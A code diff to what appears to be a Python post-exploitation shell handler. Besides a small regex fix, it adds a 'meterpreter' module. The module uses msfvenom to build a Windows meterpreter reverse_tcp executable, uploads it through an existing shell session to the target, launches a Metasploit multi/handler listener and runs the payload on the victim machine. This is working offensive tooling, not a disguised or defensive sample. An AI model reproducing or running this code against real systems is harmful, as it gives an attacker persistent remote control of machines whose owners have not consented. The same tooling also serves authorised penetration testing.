@@ -1496,7 +1496,7 @@ class Session:
 				_bin = self.bin['python3'] or self.bin['python']
 				if _bin:
 					version = self.exec(f"{_bin} -V || {_bin} --version", value=True)
-					major, minor, micro = re.search("Python (\d+)\.(\d+)(?:\.(\d+))?", version).groups()
+					major, minor, micro = re.search(r"Python (\d+)\.(\d+)(?:\.(\d+))?", version).groups()
 					self.remote_python_version = (int(major), int(minor), int(micro))
 					if self.remote_python_version >= (2, 3): # TODO
 						self._can_deploy_agent = True
@@ -3181,6 +3181,30 @@ class lse(Module):
 			self.session.script(BINARIES['lse'])
 		else:
 			logger.error("This module runs only in Unix shells")
+
+class meterpreter(Module):
+	description = 'Get a meterpreter shell'
+	def run(self):
+		if self.session.OS == 'Unix':
+			logger.error("This module runs only in Windows shells")
+		else:
+			payload_path = f"/dev/shm/{rand(10)}.exe"
+			host = self.session._host
+			port = 5555
+			payload_creation_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
+			result = subprocess.run(payload_creation_cmd, shell=True, text=True, capture_output=True)
+
+			if result.returncode == 0:
+				logger.info("Payload created!")
+				uploaded_path = self.session.upload(payload_path)
+				if uploaded_path:
+					meterpreter_handler_cmd = f'msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST {host}; set LPORT {port}; run"'
+					Open(meterpreter_handler_cmd, terminal=True)
+					print(meterpreter_handler_cmd)
+					self.session.exec(uploaded_path[0])
+			else:
+				logger.error(f"Cannot create meterpreter payload: {result.stderr}")
+
 
 for subclass in Module.__subclasses__():
 	subclass()
